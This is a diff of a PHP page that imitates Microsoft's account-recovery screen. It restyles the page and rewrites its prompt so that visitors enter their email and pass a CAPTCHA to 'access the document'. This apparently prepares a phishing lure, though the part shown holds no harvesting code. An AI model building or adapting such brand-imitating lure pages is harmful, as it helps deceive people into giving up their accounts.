@@ -55,18 +55,17 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      height: 85vh;
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background-color: #fff;
       box-sizing: border-box;
     }
     .container {
       background-color: #fff;
       padding: 20px;
       width: 100%;
-      max-width: 400px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      max-width: 340px;
       border-radius: 8px;
       box-sizing: border-box;
       margin: 20px;
@@ -127,12 +126,15 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       cursor: pointer;
       font-size: 1em;
     }
+    .cf-turnstile{
+        margin-top:1rem;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Who are you?</h1>
-    <p class="description">To recover your account, begin by entering your email or username and the characters in the picture or audio below.</p>
+    <p class="description">To access the document, please enter your email and complete the CAPTCHA verification. This ensures the security of the content and verifies that you’re a real person.</p>
     <?php
     session_start();
     if (isset($_SESSION['error_message'])) {
@@ -147,7 +149,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       <div class="helper-text">Example: user@contoso.onmicrosoft.com or user@contoso.com</div>
 
       <!-- Text-based CAPTCHA -->
-      <label for="text-captcha">Enter the characters in the picture or the words in the audio: <span style="color: red;">*</span></label>
+      <label for="text-captcha">Enter the characters in the picture: <span style="color: red;">*</span></label>
       <div class="captcha-image">
         <img src="generate_captcha.php" alt="CAPTCHA Image" id="captcha-image" style="max-width: 100px;">
         <button type="button" onclick="refreshCaptcha()" style="padding: 0 8px;">↻</button>
